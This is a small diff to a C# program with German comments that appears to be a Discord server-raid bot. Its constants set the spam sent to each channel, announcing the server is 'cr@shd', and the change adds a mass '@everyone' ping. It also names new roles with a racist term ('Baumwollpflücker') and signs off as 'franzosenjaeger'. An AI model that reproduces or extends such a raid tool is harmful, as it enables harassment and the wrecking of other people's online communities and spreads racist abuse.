@@ -13,7 +13,7 @@ class Program
     const int    MESSAGE_COUNT = 30;                   // Nachrichten pro Kanal
     const string MESSAGE_TEXT  =
         "✅ **https://youtu.be/4Lc-LarMzSc?is=TWhwIqrlVgo9td9X**\n" +
-        "> server cr@shd.\n" +
+        "> server cr@shd @everyone.\n" +
         "> powered by franzosenjaeger**";
 
     const string NEW_ROLE_NAME  = "Baumwollpflücker"; // Name der neuen Rollen
